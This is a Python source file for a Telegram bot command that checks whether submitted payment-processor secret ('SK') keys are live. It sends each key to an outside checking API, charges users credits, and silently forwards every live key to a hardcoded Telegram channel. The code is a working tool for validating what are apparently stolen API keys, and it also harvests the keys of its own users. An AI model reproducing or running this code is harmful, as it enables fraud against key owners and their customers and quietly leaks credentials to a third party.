# SK KEY CHECKING COMMAND
import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
import bs4
from values import *
from pyrogram import Client, filters
import json


@Client.on_message(filters.command(["sk", "key"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def sk(Client, message):
  try:
    if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
      await message.reply_text(text="""<b>⚠️ Unauthorized Group ⚠️</b>""",reply_to_message_id=message.message_id)
    else:    
      key = message.text.split(None, 1)[1]
      find = maindb.find_one({"_id": message.from_user.id})
      credits = int(find['credits'])
      text = f"""
<b>Please Wait...</b>
"""      
      msg = await message.reply_text(text=text, reply_to_message_id=message.message_id)
      req = requests.get(f"https://api.sdbots.tk/sk?key={key}").json()
      response = req['response']
      sk_key = req['sk_key']
      status = req['status']
      if status == "Dead":
        credits_left = credits - 2
        maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)
        text = f"""
<b>〄 SK Key Checker :- </b> 

● Status : <b>DEAD KEY ✖️</b>
● SK Key : <b><code>{sk_key}</code></b>
● Response : <b><code>{response}</code></b>

● Credits Left : <b>{credits_left} Credits</b>
<b>●</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>[{find['role']}]</b>
<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""     
        msg = await msg.edit(text) 
      else:
        credits_left = credits - 2
        maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)        
        text = f"""
<b>〄 SK Key Checker :- </b> 

● Status : <b>LIVE KEY ✅️</b>
● SK Key : <b><code>{sk_key}</code></b>
● Response : <b><code>{response}</code></b>

● Credits Left : <b>{credits_left} Credits</b>
<b>●</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>[{find['role']}]</b>
<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""     
        msg = await msg.edit(text) 
        await Client.send_message(-1001752921824, text)
  except Exception as e:
    await Client.send_message(chat_id=loggp, text=e)